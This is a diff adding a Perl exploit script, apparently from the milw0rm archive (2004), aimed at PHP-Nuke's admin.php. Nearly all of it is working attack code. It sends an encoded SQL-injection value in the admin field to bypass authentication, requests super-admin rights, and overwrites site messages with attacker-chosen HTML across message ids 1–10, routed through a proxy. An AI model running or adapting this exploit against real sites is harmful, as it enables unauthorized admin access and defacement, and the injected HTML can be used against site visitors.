@@ -1,0 +1,65 @@
+#!/usr/bin/perl
+#
+
+use LWP; 
+
+$log = "pos_komen_phpnuke_savemsg.txt"; 
+$Agent = "Mbahmubangga/1.0";
+$proxy = "http://172.9.1.11:80/"; # proxy:port ...
+$browser = LWP::UserAgent->new;
+$browser -> agent($Agent);
+
+$url = 'http://www.sitewithphpnuke.com/admin.php';
+
+$browser->proxy(http => $proxy) if defined($proxy);
+
+printlog ("\nProcessing: $url\n");
+
+for ($a = 1; $a < 11 ; $a++) {
+
+$mid=$a;
+
+$loginpost = $url;
+$loginrequest = HTTP::Request->new(POST => $loginpost);
+$loginrequest->content_type('application/x-www-form-urlencoded');
+$loginsend = 
+'title=<h1>JUST TESTING</h1>'.
+'&content=you can put HTML format here, all up to you now, 1 liner of course,
+or multiple liner with dot'.
+'&mlanguage='. #message language
+'&expire=0'. #unlimited
+'&active=1'. #yes
+'&chng_date=0'.
+'&view=1'. #all visitors
+'&mdate='.
+'&mid='.$mid. #the message id, commonly has value under 11
+'&admin=eCcgVU5JT04gU0VMRUNUIDEvKjox'. #our magic ammo ==> x'%20UNION%20SELECT%201/*:1
+'&add_radminsuper=1'. #the super user / G O D
+'&op=savemsg'; #operation
+$loginrequest->content-length($loginsend);
+$loginrequest->content($loginsend);
+$loginresponse = $browser->request($loginrequest);
+$logincek = $loginresponse->as_string;
+#print ($logincek);
+
+
+if ($logincek =~ /(500 Can\'t read entity body\: Unknown error)|(411 Length Required)/){
+printlog ("$mid attempting edit and saving message sending OK ".$loginresponse-
+>status_line ."\n") ;
+}
+else {
+printlog ("Could be failure ".$loginresponse->status_line ."\n");
+last;
+}
+
+} #end of for
+
+sub printlog {
+print @_[0]; 
+open(lo,">>$log");
+print lo @_[0];
+close(lo);
+return;
+}
+
+# milw0rm.com [2004-09-16]
